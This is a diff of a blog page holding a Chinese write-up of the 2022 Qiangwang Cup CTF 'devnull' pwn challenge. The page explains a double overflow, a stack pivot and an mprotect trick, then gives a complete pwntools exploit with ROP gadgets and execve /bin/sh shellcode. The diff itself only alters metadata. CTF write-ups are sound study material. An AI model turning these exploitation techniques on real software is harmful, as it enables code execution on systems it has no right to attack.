@@ -129,15 +129,13 @@
 
 
 
-<meta name="description" content="devnull存在两次溢出，第一次溢出使得fd为0，即相当于我们可以控制read的内容，第二次溢出就是经典的栈溢出，完成栈迁移。有几个注意的点：一是mprotect函数的port为1而不是7，需要我们重新伪造一个port为7的mprotect函数，在最后输出给我们Thanks\n信息之后会将rdx设置成7，rdi的值我们可以通过以下的两端神奇汇编来解决，mov rax, [rbp-0x18]; l">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 强网杯">
 <meta property="og:url" content="https://pursuezhou.github.io/2022/08/07/CTF/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/index.html">
 <meta property="og:site_name" content="Pursue">
-<meta property="og:description" content="devnull存在两次溢出，第一次溢出使得fd为0，即相当于我们可以控制read的内容，第二次溢出就是经典的栈溢出，完成栈迁移。有几个注意的点：一是mprotect函数的port为1而不是7，需要我们重新伪造一个port为7的mprotect函数，在最后输出给我们Thanks\n信息之后会将rdx设置成7，rdi的值我们可以通过以下的两端神奇汇编来解决，mov rax, [rbp-0x18]; l">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-08-06T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-13T12:07:02.269Z">
+<meta property="article:modified_time" content="2024-03-14T02:01:57.284Z">
 <meta property="article:author" content="Pursue">
 <meta property="article:tag" content="强网杯">
 <meta name="twitter:card" content="summary">
@@ -427,8 +425,6 @@
 
       
         <h2 id="devnull"><a href="#devnull" class="headerlink" title="devnull"></a>devnull</h2><p>存在两次溢出，第一次溢出使得fd为0，即相当于我们可以控制read的内容，第二次溢出就是经典的栈溢出，完成栈迁移。有几个注意的点：一是mprotect函数的port为1而不是7，需要我们重新伪造一个port为7的mprotect函数，在最后输出给我们<code>Thanks\n</code>信息之后会将rdx设置成7，rdi的值我们可以通过以下的两端神奇汇编来解决，<code>mov rax, [rbp-0x18]; leave; ret</code>和<code>mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</code>；二是在栈迁移的时候要注意迁移到可写的段上；三是注意我们shellcode的长度；四是注意程序关闭了标准输出，所以我们可以采用shell命令<code>exec 1&gt;&amp;2</code>来讲标准输出和标准错误给绑定到一起。</p>
-<span id="more"></span>
-
 <p>WP如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./devnull&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sh_x64_21 = <span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : sh.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : sh.sendlineafter(text, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : sh.sendline(data)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000401350</span>  <span class="comment"># mov rax, [rbp-0x18]; leave; ret</span></span><br><span class="line">mprotect = <span class="number">0x00000000004012D0</span>  <span class="comment"># mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</span></span><br><span class="line">save = <span class="number">0x3fe000</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">sa(<span class="string">&#x27;please input your filename\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(save)</span><br><span class="line">pld += p64(save + <span class="number">0x18</span>) + p64(magic)</span><br><span class="line">sa(<span class="string">&#x27;Please write the data you want to discard\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">pld = p64(save) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">pld += p64(<span class="number">0</span>) + p64(mprotect) + p64(<span class="number">0</span>) + p64(save + <span class="number">0x38</span>)</span><br><span class="line">pld += asm(shellcraft.execve(save + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x401510&#x27;)</span></span><br><span class="line">sa(<span class="string">&#x27;please input your new data\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;2&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -581,7 +577,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
